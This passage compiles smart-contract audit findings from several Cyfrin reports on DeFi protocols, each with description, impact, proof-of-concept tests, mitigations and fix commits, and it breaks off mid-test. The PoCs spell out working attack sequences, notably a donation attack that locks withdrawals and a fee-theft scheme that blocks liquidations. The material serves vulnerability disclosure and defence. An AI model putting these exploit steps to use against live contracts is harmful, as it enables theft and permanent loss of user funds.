**Impact:** Once the game has concluded, when the winners try to claim their rewards this will revert with `RankedRewardsNotSet` or `NumberOfWinnersMismatch`. There is no way to claim the rewards and because the game is in the `Concluded` state it can't be cancelled - the tokens are permanently locked in the contract.

**Proof of Concept:** Add the PoC to `SessionManagerEndGame.t.sol`:
```solidity
function test_setRankedRewardsNotCalled_gameStarted_gameConcludes_cantClaimRewards() public {
    _createGame();

    _startGame();
    _revealQuestion();
    _warpToEndTime();
    sessionManager.endGame(1);
    _concludeGame();

    vm.expectRevert(); // RankedRewardsNotSet(1)
    vm.prank(contestants[0]);
    sessionManager.claimRewards(1, 0);
}
```

**Recommended Mitigation:** Don't allow the game to be started unless ranked rewards / number of winners have been set. Ideally:
* the `IRewardStrategy` interface would have an external function `rewardsConfigured` which returns `true` if its rewards mechanism has been configured and `false` otherwise
* `FixedRanksReward` and `ProportionalToXPReward` would both implement `rewardsConfigured` checking whether their internal reward implementations have been correctly configured
* `SessionManager::startAndRevealGameQuestion` would call `rewardsConfigured` on its reward strategy and revert if it returned `false`

**Majority Games:**
Fixed in commits [a2e353e](https://github.com/Engage-Protocol/engage-protocol/commit/a2e353e664f7707d49a3ca9ca2bea792d731711c), [96d5fbe](https://github.com/Engage-Protocol/engage-protocol/commit/96d5fbe3132bbbecb509c8ca90cc785587da5e61).

**Cyfrin:** Verified.

## [C-10] Instant withdrawals in priority pool can result in loss of funds for StakingProxy contract
- Severity: `Critical`
- Source report: `stakingproxy.md`

### Detailed Content (from source)
**Description:** When instant withdrawals are enabled in the priority pool, `staker` can permanently lose funds when withdrawing through the `StakingProxy` contract. The issue occurs because the withdrawn amount is not properly updated in the priority pool's `_withdraw` function during instant withdrawals, causing the tokens to be stuck in the Priority Pool while users lose their LSTs.

`PriorityPool::_withdraw`

```solidity
function _withdraw(
    address _account,
    uint256 _amount,
    bool _shouldQueueWithdrawal,
    bool _shouldRevertOnZero,
    bytes[] memory _data
) internal returns (uint256) {
    if (poolStatus == PoolStatus.CLOSED) revert WithdrawalsDisabled();

    uint256 toWithdraw = _amount;
    uint256 withdrawn;
    uint256 queued;

    if (totalQueued != 0) {
        uint256 toWithdrawFromQueue = toWithdraw <= totalQueued ? toWithdraw : totalQueued;

        totalQueued -= toWithdrawFromQueue;
        depositsSinceLastUpdate += toWithdrawFromQueue;
        sharesSinceLastUpdate += stakingPool.getSharesByStake(toWithdrawFromQueue);
        toWithdraw -= toWithdrawFromQueue;
        withdrawn = toWithdrawFromQueue; // -----> @audit withdrawn is set here
    }

    if (
        toWithdraw != 0 &&
        allowInstantWithdrawals &&
        withdrawalPool.getTotalQueuedWithdrawals() == 0
    ) {
        uint256 toWithdrawFromPool = MathUpgradeable.min(stakingPool.canWithdraw(), toWithdraw);
        if (toWithdrawFromPool != 0) {
            stakingPool.withdraw(address(this), address(this), toWithdrawFromPool, _data);
            toWithdraw -= toWithdrawFromPool; // -----> @audit BUG withdrawn is not updated here
        }
    }
    // ... rest of the function
}
```

When processing instant withdrawals, the function fails to update the withdrawn variable after successfully withdrawing tokens from the staking pool. This leads to the following sequence:

1. Staker initiates withdrawal through `StakingProxy::withdraw`
2. `StakingProxy` burns LSTs
3. `PriorityPool` receives underlying tokens from Staking Pool
4. But `PriorityPool` doesn't transfer tokens because `withdrawn` wasn't updated
5. Tokens remain stuck in `PriorityPool` while `StakingProxy` loses access to its liquid staking tokens

**Impact:** `StakingProxy` permanently loses access to its liquid staking tokens when attempting instant withdrawals

**Proof of Concept:** Copy the following test into `staking-proxy.test.ts`

```typescript
 it('instant withdrawals from staking pool are not transferred to staker', async () => {
    const { stakingProxy, stakingPool, priorityPool, signers, token, strategy, accounts } = await loadFixture(deployFixture)

    // Enable instant withdrawals
    await priorityPool.setAllowInstantWithdrawals(true)

    // Deposit initial amount
    await token.approve(stakingProxy.target, toEther(1000))
    await stakingProxy.deposit(toEther(1000), ['0x'])

    // Setup for withdrawals
    await strategy.setMaxDeposits(toEther(2000))
    await strategy.setMinDeposits(0)

    // Track all relevant balances before withdrawal
    const preTokenBalance = await token.balanceOf(stakingProxy.target)
    const preLSTBalance = await stakingPool.balanceOf(stakingProxy.target)

    const prePPBalance = await token.balanceOf(priorityPool.target)

    const withdrawAmount = toEther(500)

    console.log('=== Before Withdrawal ===')
    console.log('Initial LST Balance - Proxy contract:', fromEther(preLSTBalance))
    console.log('Initial Token Balance - Poxy contract:', fromEther(preTokenBalance))


    // Perform withdrawal
    await stakingProxy.withdraw(
        withdrawAmount,
        0,
        0,
        [],
        [],
        [],
        ['0x']
    )

    // Check all balances after withdrawal
    const postTokenBalance = await token.balanceOf(stakingProxy.target)
    const postPPBalance = await token.balanceOf(priorityPool.target)
    const postLSTBalance = await stakingPool.balanceOf(stakingProxy.target)

    console.log('=== After Withdrawal ===')
    console.log('Priority Pool - token balance change:', fromEther(postPPBalance - prePPBalance))
    console.log('Staking Proxy - token balance change:', fromEther(postTokenBalance - preTokenBalance))
    console.log('Staking Proxy - LST balance change:', fromEther(postLSTBalance - preLSTBalance))

    const lstsRedeemed = fromEther(preLSTBalance - postLSTBalance)

    // Assertions

    // 1. Staking Proxy has redeeemed all his LSTs
    assert.equal(
      lstsRedeemed,
        500,
        "Staker redeemed 500 LSTs"
    )

    // 2. But staking proxy doesn't receive underlying tokens
    assert.equal(
      fromEther(postTokenBalance - preTokenBalance),
        0,
        "Staking Proxy didn't receive any tokens despite losing LSTs"
    )

    // 3. The tokens are stuck in Priority Pool
    assert.equal(
        fromEther(postPPBalance- prePPBalance),
        500,
        "Priority Pool is holding the withdrawn tokens"
    )
  })
```

**Recommended Mitigation:** Consider updating the `withdrawn` variable when processing instant withdrawals in `PriorityPool::_withdraw`

**Stake.Link:** Fixed in commit [5f3d282](https://github.com/stakedotlink/contracts/commit/5f3d2829f86bc74d6b9e805d7e61d9392d6b21b1)

**Cyfrin:** Verified.

\clearpage

## [C-11] Mechanism to prevent donation attack can be gamed to cause withdrawals to revert causing assets to get stuck on the Strategy
- Severity: `Critical`
- Source report: `tranches.md`

### Detailed Content (from source)
**Description:** Each time a withdrawal occurs, a check is performed to ensure that TrancheShares `totalSupply()` doesn't fall below a pre-defined boundary (`MIN_SHARES`). But, there is a way to game this mechanism such that it causes all withdrawals to revert because the `shares<=>assets ratio` is manipulated, which causes the Tranche to mint small amounts of shares, leading to the `totalSupply()` to not exceed the `MIN_SHARES` boundary, as a result, all withdrawals will revert.

```solidity

    function _withdraw(
        ...
    ) internal override {
       ...
        _onAfterWithdrawalChecks();
        emit Withdraw(caller, receiver, owner, assets, shares);
    }

    function _onAfterWithdrawalChecks () internal view {
@>      if (totalSupply() < MIN_SHARES) {
            revert MinSharesViolation();
        }
    }
```

The attack is a first donation attack, in which an attacker donates `sUSDe` directly to the `Strategy`, this inflates the `totalAssets` in the system, and then the attacker makes a deposit for `1.1USDe`, which causes the share<=>assets rate to be manipulated, i.e. for a deposit of 1.1e18 USDe, the Tranche will mint 1 wei of shares. As a result, any subsequent deposit will mint shares at a manipulated rate, and the problem arises when withdrawals are attempted because of the `_onAfterWithdrawalChecks()`, the remaining `totalSupply()` won't exceed `MIN_SHARES`.



**Impact:** The withdrawal mechanism can be broken, causing user-deposited assets to get stuck on the `Strategy` contract.

**Proof of Concept:** Add the next PoC to the `CDO.t.sol` test file, and import the `IErrors` interface in the imports section.
`import { IErrors } from "../contracts/tranches/interfaces/IErrors.sol";`

```solidity
    function test_GameDonationAttackProtectionToTrapAssets() public {
        address alice = makeAddr("Alice");
        address bob = makeAddr("Bob");
        // Same value as in the Tranche contract
        uint256 MIN_SHARES = 0.1 ether;

        USDe.mint(bob, 1000 ether);
        vm.startPrank(bob);
            //@audit => Bob initializes the exchange rate on sUSDe
            USDe.approve(address(sUSDe), type(uint256).max);
            sUSDe.deposit(1000 ether, bob);
        vm.stopPrank();

        uint256 initialDeposit = 1000 ether;
        USDe.mint(alice, initialDeposit);
        USDe.mint(bob, initialDeposit);

        vm.startPrank(alice);
            USDe.approve(address(sUSDe), type(uint256).max);
            sUSDe.deposit(1e18, alice);
            // Step 1 => Alice transfers 1 sUSDe directly to the strategy to inflate the exchange rate and deposits 1.1e18 USDe that results in minting 1 TrancheShare
            sUSDe.transfer(address(sUSDeStrategy), 1e18);
            USDe.approve(address(jrtVault), type(uint256).max);
            jrtVault.deposit(1.1e18, alice);
        vm.stopPrank();

        assertEq(jrtVault.totalSupply(), 1);

        USDe.mint(bob, 1_000_000e18);
        vm.startPrank(bob);
            USDe.approve(address(jrtVault), type(uint256).max);
            //Step 2 => Now Bob deposits 1million USDe into the Tranche
            //Because of the manipulated exchange rate, the total minted TrancheShares for such a big deposits won't even be enough to reach the MIN_SHARES
            jrtVault.deposit(1_000_000e18, bob);
            assertLt(jrtVault.totalSupply(), MIN_SHARES);

            //Step 3 => Bob attempts to make a withdrawal, but the withdrawal reverts because the total shares on the Tranche don't reach MIN_SHARES
            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(10_000e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(100e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(90_000e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(1e18, bob, bob);
        vm.stopPrank();
    }
```

**Recommended Mitigation:**
1. Consider making a deposit of at least 1 full USDe on the same tx when the Tranche is deployed. Ideally, set the receiver of the deposit as `address(1)`, these shares should be considered unusable, so the minted TrancheShares are effectively used as the lower bound to not fall below the MIN_SHARES.

2. Take special care with the deployment script. To grant approvals to the strategy for pulling the deposited assets from the Tranche, you must call `Tranche::configure` (this function is required to call `StrataCDO::configure`, which requires the 2 Tranches and Strategy to have been deployed).

**Strata:**
Fixed in commit [f344885](https://github.com/Strata-Money/contracts-tranches/commit/f344885d35f2acfd93b80a9c8d37df7e89ae2f08) by transferring any donations made to the strategy before the first deposit into the reserve.

**Cyfrin:** Verified. On the same transaction, when enabling deposits and making the first deposit, `cdo::reduceReserve` must be called before making the first deposit to sweep any donations to the strategy, as deposits were not enabled before this point.

\clearpage

## [C-12] Liquidations can be made to revert by an attacker through various means, causing losses to liquidators and bad debt to accrue in the vault
- Severity: `Critical`
- Source report: `vii.md`

### Detailed Content (from source)
**Description:** Coordination between two malicious accounts combined with various other attack vectors fully documented in separate findings can be leveraged by an attacker to engineer scenarios in which liquidators are disincentivised or otherwise unable to unwind liquidatable positions due to an inability to recover the underlying collateral to which they are entitled.

To summarise the issues that make this attack possible:
* Fee theft causes partial unwraps to revert for positions that were already partially unwrapped. The expectation is that partial liquidation will execute and liquidator will perform a partial unwrap to recover the underlying collateral; however, this will not be possible if the wrapper contract holds insufficient balance to process the proportional transfer.
* Incorrect accounting causes transfer amounts to become inflated for positions that were previously partially unwrapped. This can cause liquidation to revert as the violator will have insufficient ERC-6909 to complete the transfer.
* Enabling collateral for which the sender has no ERC-6909 balance can be similarly utilized to block successful transfer of other collateral assets against which the violator has borrowed vault assets.

Consider the following scenario:
* Alice and Bob are controlled by the same malicious user.
* Alice owns a position represented by `tokenId1` and Bob owns a position represented by `tokenId2`.
* Both `tokenId1` and `tokenId2` positions accrue some fees.
* Alice transfers a small portion of `tokenId1` to Bob.
* Bob performs a small partial unwrap of `tokenId1`.
* Both `tokenId1` and `tokenId2` positions accrue some more fees.
* Alice borrows the max debt and shortly after the position becomes liquidatable.
* Bob front-runs partial liquidation of `tokenId1` with full unwrap of `tokenId2` through partial unwrap (fee theft exploit).
* Partial liquidation succeeds, transferring a portion of `tokenId1` to the liquidator.
* Liquidator attempts to partially unwrap `tokenId1` to retrieve the underlying principal collateral plus fees but it reverts.
* This either causes a loss to the liquidator if executed in separate transactions or prevents/disincentivizes partial liquidation if executed atomically.
* The position continues to become undercollateralized until it is fully liquidatable.
* The transfer during liquidation will revert due to the transfer inflation issue calculating a transfer amount larger than Alice's balance.
* Alice's position is undercollateralized and bad debt accrues in the vault.
* Note: without the transfer issue, Alice's entire `tokenId1` balance is transferred to the liquidator, but still it is not possible to recover the underlying collateral even with full unwrap as the liquidator does not own the entire ERC-6909 supply (Bob still holds a small portion).

As demonstrated below, this complex series of steps can successfully block liquidations. The violator can partially unwrap one position, and with another position can steal the remaining fees, leaving wrapper contract without sufficient currency balance for the remaining pending fees of the partially unwrapped position. When partial liquidation occurs, even if the liquidator is unwrapping a small portion of the full position, there are no fees on the balance which will cause the liquidation to revert. This setup can in fact be drastically reduced by simply enabling collateral for which the sender has no ERC-6909 balance, blocking successful transfer of other collateral assets backing the debt without relying on the fee theft.

**Impact:** An attacker can deliberately cause DoS that prevents their position from being liquidated with high likelihood. This has significant impact for the vault which will accrue bad debt.

**Proof of Concept:** Referencing the diff provided in a separate issue which defines `increasePosition()`, run the following tests with `forge test --mt test_blockLiquidationsPoC -vvv`:

* This first PoC uses the enabling of unowned collateral and transfer miscalculation:

```solidity
function test_blockLiquidationsPoC_enableCollateral() public {
    address attacker = makeAddr("attacker");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);

    // 2. attacker wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, attacker);

    // 3. attacker enables both tokenId1 and tokenId2 as collateral
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    // 4. attacker max borrows from vault
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 5. simulate attacker becoming liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));

    // @audit-issue => liquidator attempts to liquidate attacker
    // @audit-issue => but transfer reverts due to insufficient ERC-6909 balance of tokenId1
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            attacker,
            wrapper.balanceOf(liquidator, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);
}
```

* This second PoC uses the fee theft and transfer miscalculation:

```solidity
function test_blockLiquidationsPoC_transferInflation() public {
    address attacker = makeAddr("attacker");
    address accomplice = makeAddr("accomplice");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. attacker wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, attacker);

    // 2. accomplice wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);

    // 3. swap so that some fees are generated
    swapExactInput(borrower, address(token0), address(token1), 100_000 * unit0);

    // 4. attacker enables tokenId1 as collateral and transfers a small portion to accomplice
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.transfer(accomplice, wrapper.balanceOf(attacker) / 100);

    // 5. accomplice enables tokenId2 as collateral and partially unwraps
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId1,
        accomplice,
        wrapper.balanceOf(accomplice, tokenId1) / 2,
        bytes("")
    );

    // 6. attacker borrows max debt from eVault
    startHoax(attacker);
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 7. simulate attacker becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    // 8. accomplice executes fee theft against attacker
    startHoax(accomplice);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT(),
        bytes("")
    );
    wrapper.unwrap(
        accomplice,
        tokenId2,
        borrower
    );
    startHoax(borrower);
    wrapper.underlying().approve(address(mintPositionHelper), tokenId2);
    increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, borrower);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT() * 99 / 100,
        bytes("")
    );

    // 9. liquidator attempts to liquidate attacker
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);

    // full liquidation reverts due to transfer inflation issue
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            attacker,
            wrapper.balanceOf(attacker, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);

    // 10. at most 1% of the partially liquidated position can be unwrapped
    eVault.liquidate(attacker, address(wrapper), maxRepay / 10, 0);
    uint256 partialBalance = wrapper.balanceOf(liquidator, tokenId1) / 10;

    vm.expectRevert(
        abi.encodeWithSelector(
            CustomRevert.WrappedError.selector,
            liquidator,
            bytes4(0),
            bytes(""),
            abi.encodePacked(bytes4(keccak256("NativeTransferFailed()")))
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator,
        partialBalance,
        bytes("")
    );
}
```

* This third PoC demonstrates that it is still possible to cause losses to the liquidator using fee theft even after the transfer issue is fixed (apply the recommended mitigation diff to observe this test passing):

```solidity
function test_blockLiquidationsPoC_feeTheft() public {
    address attacker = makeAddr("attacker");
    address accomplice = makeAddr("accomplice");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. attacker wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, attacker);

    // 2. accomplice wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);

    // 3. swap so that some fees are generated
    swapExactInput(borrower, address(token0), address(token1), 100_000 * unit0);

    // 4. attacker enables tokenId1 as collateral and transfers a small portion to accomplice
    startHoax(attacker);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.transfer(accomplice, wrapper.balanceOf(attacker) / 100);

    // 5. accomplice enables tokenId2 as collateral and partially unwraps
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId1,
        accomplice,
        wrapper.balanceOf(accomplice, tokenId1) / 2,
        bytes("")
    );

    // 6. attacker borrows max debt from eVault
    startHoax(attacker);
    evc.enableCollateral(attacker, address(wrapper));
    evc.enableController(attacker, address(eVault));
    eVault.borrow(type(uint256).max, attacker);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 7. simulate attacker becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, attacker, address(wrapper));
    assertTrue(maxRepay > 0);

    // 8. accomplice executes fee theft against attacker
    startHoax(accomplice);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT(),
        bytes("")
    );
    wrapper.unwrap(
        accomplice,
        tokenId2,
        borrower
    );
    startHoax(borrower);
    wrapper.underlying().approve(address(mintPositionHelper), tokenId2);
    increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, borrower);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, accomplice);
    startHoax(accomplice);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    wrapper.unwrap(
        accomplice,
        tokenId2,
        accomplice,
        wrapper.FULL_AMOUNT() * 99 / 100,
        bytes("")
    );

    // 9. liquidator fully liquidates attacker
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);
    eVault.liquidate(attacker, address(wrapper), maxRepay, 0);

    // 10. liquidator repays the debt
    deal(token1, liquidator, 1_000_000_000 * unit1);
    IERC20(token1).approve(address(eVault), type(uint256).max);
    eVault.repay(type(uint256).max, liquidator);
    evc.disableCollateral(liquidator, address(wrapper));
    eVault.disableController();

    // 11. attempting to unwrap even 1% of the position fails
    uint256 balanceToUnwrap = wrapper.balanceOf(liquidator, tokenId1) / 100;

    vm.expectRevert(
        abi.encodeWithSelector(
            CustomRevert.WrappedError.selector,
            liquidator,
            bytes4(0),
            bytes(""),
            abi.encodePacked(bytes4(keccak256("NativeTransferFailed()")))
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator,
        balanceToUnwrap,
        bytes("")
    );

    // 12. full unwrap is blocked by accomplice's non-zero balance
    vm.expectRevert(
        abi.encodeWithSelector(
            bytes4(keccak256("ERC6909InsufficientBalance(address,uint256,uint256,uint256)")),
            liquidator,
            wrapper.balanceOf(liquidator, tokenId1),
            wrapper.totalSupply(tokenId1),
            tokenId1
        )
    );
    wrapper.unwrap(
        liquidator,
        tokenId1,
        liquidator
    );
}
```

**Recommended Mitigation:** To mitigate this issue, the recommendations for all other issues should be applied:
* Decrement the `tokensOwed` state for a given ERC-6909 `tokenId` once the corresponding fees have been have been collected.
* Account for only the violator's `tokenId` balance when performing the `normalizedToFull()` calculation.
* Consider preventing collateral from being enabled when the sender does not hold any ERC-6909 balance of the `tokenId`.

**VII Finance:** Fixed in commits [8c6b6cc](https://github.com/kankodu/vii-finance-smart-contracts/commit/8c6b6cca4ed65b22053dc7ffaa0b77d06a160caf) and [b7549f2](https://github.com/kankodu/vii-finance-smart-contracts/commit/b7549f2700af133ce98a4d6f19e43c857b5ea78a).

**Cyfrin:** Verified. The fee theft and inflated ERC-6909 transfers are no longer valid attack vectors. It is still possible to enable collateral without holding any ERC-6909 balance, but with the other mitigations applied this simply results in a zero value transfer as formally verified by the following Halmos test:

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.26;

import {Math} from "lib/openzeppelin-contracts/contracts/utils/math/Math.sol";
import {Test} from "forge-std/Test.sol";

contract MathTest is Test {
    // halmos --function test_mulDivPoC
    function test_mulDivPoC(uint256 amount, uint256 value) public {
        vm.assume(value != 0);
        assertEq(Math.mulDiv(amount, 0, value, Math.Rounding.Ceil), 0);
    }
}
```

\clearpage
## High Risk

## [M-13] DelegationManager is incompatible with smart contract wallets with Approved hashes
- Severity: `Medium`
- Source report: `DelegationFramework1.md`

### Detailed Content (from source)
**Description:** In the `DelegationManager` contract, there is a limitation that affects smart contract wallets that implement pre-approved hashes functionality, such as Safe (formerly Gnosis Safe) wallets. The current implementation rejects delegations with empty signatures for both EOA and smart contract wallets.

```solidity
// DelegationManager.sol
    function redeemDelegations( ... ) ... {
        ...
        for (uint256 batchIndex_; batchIndex_ < batchSize_; ++batchIndex_) {
            ...
            if (delegations_.length == 0) { ... } else {
                ...
                for (uint256 delegationsIndex_; delegationsIndex_ < delegations_.length; ++delegationsIndex_) {
                    ...
>>                  if (delegation_.signature.length == 0) {
                        // Ensure that delegations without signatures revert
                        revert EmptySignature();
                    }

                    if (delegation_.delegator.code.length == 0) {
                        // Validate delegation if it's an EOA
                        ...
                    } else {
                        // Validate delegation if it's a contract
                        ...
>>                      bytes32 result_ = IERC1271(delegation_.delegator).isValidSignature(typedDataHash_, delegation_.signature);
                        ...
                    }
                }
```

This presents a compatibility issue with Safe wallets and similar smart contract wallets that use a pattern where empty signatures trigger checking for pre-approved hashes. In Safe's implementation:

[SignatureVerifierMuxer.sol#L163-L165](https://github.com/safe-global/safe-smart-account/blob/main/contracts/handler/extensible/SignatureVerifierMuxer.sol#L163-L165)
```solidity
    function isValidSignature(bytes32 _hash, bytes calldata signature) external view override returns (bytes4 magic) {
        (ISafe safe, address sender) = _getContext();

        // Check if the signature is for an `ISafeSignatureVerifier` and if it is valid for the domain.
        if (signature.length >= 4) {
            ...

            // Guard against short signatures that would cause abi.decode to revert.
            if (sigSelector == SAFE_SIGNATURE_MAGIC_VALUE && signature.length >= 68) { ... }
        }

        // domainVerifier doesn't exist or the signature is invalid for the domain - fall back to the default
>>      return defaultIsValidSignature(safe, _hash, signature);
    }
// -----------------
    function defaultIsValidSignature(ISafe safe, bytes32 _hash, bytes memory signature) internal view returns (bytes4 magic) {
        bytes memory messageData = EIP712.encodeMessageData( ... );
        bytes32 messageHash = keccak256(messageData);
>>      if (signature.length == 0) {
            // approved hashes
>>          require(safe.signedMessages(messageHash) != 0, "Hash not approved");
        } else {
            // threshold signatures
            safe.checkSignatures(address(0), messageHash, signature);
        }
        magic = ERC1271.isValidSignature.selector;
    }
```

Since DelegationManager rejects empty signatures before calling `isValidSignature`, it prevents Safe wallets from using their pre-approved hash mechanism for delegations.

**Impact:** This limitation prevents Safe wallets and similar smart contract wallets from using their gas-efficient pre-approved hash mechanism with delegations.

**Recommended Mitigation:** To enable compatibility with Safe wallets' pre-approved hash mechanism, consider applying the empty signature check only to EOAs. Alternatively, consider documenting that Safe wallets pre-approved hashes are not supported in the current delegation framework.

**Metamask:** Fixed in commit [155d20c](https://github.com/MetaMask/delegation-framework/commit/155d20c8bf173d556ef738ec808b3583da1a7c9d).

**Cyfrin:** Resolved.

## [M-14] Missing zero length check in `AllowedMethodsEnforcer::getTermsInfo()`
- Severity: `Medium`
- Source report: `DelegationFramework1.md`

### Detailed Content (from source)
**Description:** The `AllowedMethodsEnforcer` contract's `getTermsInfo()` function correctly validates that the provided terms length is divisible by 4 (as each method selector is 4 bytes), but it fails to reject empty terms (length == 0). Empty terms would technically pass the modulo check since `0 % 4 == 0`, but would result in an empty array of allowed methods.

**Impact:** A delegation with empty terms would never allow any method to be called, as the enforcer would iterate through an empty array of allowed methods and then revert with "AllowedMethodsEnforcer:method-not-allowed" instead of properly rejecting the invalid terms with "AllowedMethodsEnforcer:invalid-terms-length"

**Recommended Mitigation:** Consider adding a specific check to ensure the terms length is greater than zero.

**Metamask:** Fixed in commit [cb2d4d7](https://github.com/MetaMask/delegation-framework/commit/cb2d4d77a66643e541141b3c8291df52340d60ce).

**Cyfrin:** Resolved.

## [M-15] Transfer Amount enforcer for ERC20 and Native transfers increase spend limit without checking actual transfers
- Severity: `Medium`
- Source report: `DelegationFramework1.md`

### Detailed Content (from source)
**Description:** Failed token/native transfers can potentially deplete a delegation's spending allowance when used with the `EXECTYPE_TRY` execution mode.

The issue occurs because the enforcer tracks spending limits by incrementing a counter in its `beforeHook`, before the actual token transfer occurs. In the `EXECTYPE_TRY` mode, if the token transfer fails, the execution continues without reverting, but the limit is still increased.

```solidity
function _validateAndIncrease(
    bytes calldata _terms,
    bytes calldata _executionCallData,
    bytes32 _delegationHash
)
    internal
    returns (uint256 limit_, uint256 spent_)
{
    // ... validation code ...

    //@audit This line increases the spent amount BEFORE the actual transfer happens
    spent_ = spentMap[msg.sender][_delegationHash] += uint256(bytes32(callData_[36:68]));
    require(spent_ <= limit_, "ERC20TransferAmountEnforcer:allowance-exceeded");
}

```

This means a malicious delegate could repeatedly attempt transfers that are designed to fail, draining the allowance without actually transferring any tokens.

**Impact:** This vulnerability allows an attacker to potentially exhaust a delegator's entire token transfer allowance without actually transferring any tokens

**Proof of Concept:**
```solidity
function test_transferFailsButSpentLimitIncreases() public {
        // Create a delegation from Alice to Bob with spending limits
        Caveat[] memory caveats = new Caveat[](3);

        // Allowed Targets Enforcer - allow only the token
